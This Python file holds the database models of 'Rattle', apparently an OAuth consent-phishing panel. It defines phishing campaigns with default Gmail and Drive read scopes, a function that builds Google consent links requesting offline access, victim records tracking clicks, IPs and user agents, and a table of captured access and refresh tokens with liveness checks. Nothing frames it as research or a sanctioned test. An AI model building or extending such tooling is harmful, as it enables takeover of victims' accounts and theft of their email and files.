"""
Rattle database models.
Kept in a separate module so background workers (liveness.py) can import
them without a circular import with app.py.
"""

import json
from datetime import datetime, timezone

from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import check_password_hash, generate_password_hash
from urllib.parse import urlencode

db = SQLAlchemy()


def utcnow():
    """Timezone-aware UTC now (datetime.utcnow is deprecated in Python 3.12+)."""
    return datetime.now(timezone.utc)


class User(db.Model):
    """Admin user for the panel"""
    __tablename__ = "user"

    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(200), nullable=False)
    totp_secret = db.Column(db.String(64), default="")
    totp_enabled = db.Column(db.Boolean, default=False)
    created_at = db.Column(db.DateTime, default=utcnow)
    is_admin = db.Column(db.Boolean, default=True)

    def set_password(self, password):
        # scrypt by default in Werkzeug 3.x - strong, salted, slow
        self.password_hash = generate_password_hash(password)

    def check_password(self, password):
        try:
            return check_password_hash(self.password_hash, password)
        except Exception:
            return False


class AuditLog(db.Model):
    """Audit trail of admin actions"""
    __tablename__ = "audit_log"

    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.DateTime, default=utcnow, nullable=False)
    username = db.Column(db.String(80), default="")
    action = db.Column(db.String(64), nullable=False)
    detail = db.Column(db.String(512), default="")
    ip = db.Column(db.String(64), default="")


class Campaign(db.Model):
    """Phishing campaign"""
    __tablename__ = "campaign"

    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    description = db.Column(db.Text)
    status = db.Column(db.String(20), default="active")
    client_id = db.Column(db.String(200), nullable=False)
    client_secret = db.Column(db.String(200), nullable=False)
    # Bug #2 fix: no hardcoded domain. Must be filled in per campaign.
    redirect_uri = db.Column(db.String(500), default="")
    scopes = db.Column(
        db.Text,
        default=(
            "openid profile email "
            "https://www.googleapis.com/auth/gmail.readonly "
            "https://www.googleapis.com/auth/drive.readonly"
        ),
    )
    phishing_url = db.Column(db.String(1000))
    created_at = db.Column(db.DateTime, default=utcnow)
    updated_at = db.Column(db.DateTime, default=utcnow, onupdate=utcnow)

    victims = db.relationship("Victim", backref="campaign", lazy=True)
    tokens = db.relationship("Token", backref="campaign", lazy=True)

    def generate_phishing_url(self):
        """Bug #5 fix: all parameters properly URL-encoded."""
        params = {
            "client_id": self.client_id,
            "redirect_uri": self.redirect_uri,
            "response_type": "code",
            "scope": " ".join(self.scopes.split()),
            "access_type": "offline",
            "prompt": "consent",
        }
        self.phishing_url = (
            "https://accounts.google.com/o/oauth2/v2/auth?" + urlencode(params)
        )
        return self.phishing_url


class Victim(db.Model):
    """Victim information"""
    __tablename__ = "victim"

    id = db.Column(db.Integer, primary_key=True)
    campaign_id = db.Column(db.Integer, db.ForeignKey("campaign.id"), nullable=False)
    # Per-target tracked link (new feature). NULL for legacy callback captures.
    tracking_id = db.Column(db.String(64), unique=True, nullable=True, index=True)
    label = db.Column(db.String(128), default="")
    clicks = db.Column(db.Integer, default=0)
    email = db.Column(db.String(200))
    ip_address = db.Column(db.String(50))
    user_agent = db.Column(db.Text)
    first_seen = db.Column(db.DateTime, default=utcnow)
    last_seen = db.Column(db.DateTime, default=utcnow)
    status = db.Column(db.String(20), default="pending")
    note = db.Column(db.Text)

    tokens = db.relationship("Token", backref="victim", lazy=True)


class Token(db.Model):
    """Captured OAuth tokens"""
    __tablename__ = "token"

    id = db.Column(db.Integer, primary_key=True)
    campaign_id = db.Column(db.Integer, db.ForeignKey("campaign.id"), nullable=False)
    victim_id = db.Column(db.Integer, db.ForeignKey("victim.id"), nullable=False)
    access_token = db.Column(db.Text)
    refresh_token = db.Column(db.Text)
    token_type = db.Column(db.String(50))
    expires_in = db.Column(db.Integer)
    expiry_time = db.Column(db.DateTime)
    scope = db.Column(db.Text)
    user_info = db.Column(db.Text)
    captured_at = db.Column(db.DateTime, default=utcnow)
    last_used = db.Column(db.DateTime)
    is_active = db.Column(db.Boolean, default=True)
    # Liveness status: "valid", "dead" or "unknown" (new feature)
    status = db.Column(db.String(16), default="unknown", index=True)
    last_checked = db.Column(db.DateTime)

    def to_dict(self):
        user_data = {}
        try:
            if self.user_info:
                user_data = json.loads(self.user_info)
        except (ValueError, TypeError):
            pass

        return {
            "id": self.id,
            "access_token": self.access_token,
            "refresh_token": self.refresh_token,
            "email": user_data.get("email", "Unknown"),
            "name": user_data.get("name", "Unknown"),
            "token_type": self.token_type,
            "expires_in": self.expires_in,
            "scope": self.scope,
            "captured_at": self.captured_at.isoformat() if self.captured_at else None,
            "is_active": self.is_active,
            "status": self.status,
            "last_checked": (
                self.last_checked.isoformat() if self.last_checked else None
            ),
            "user_info": user_data,
        }
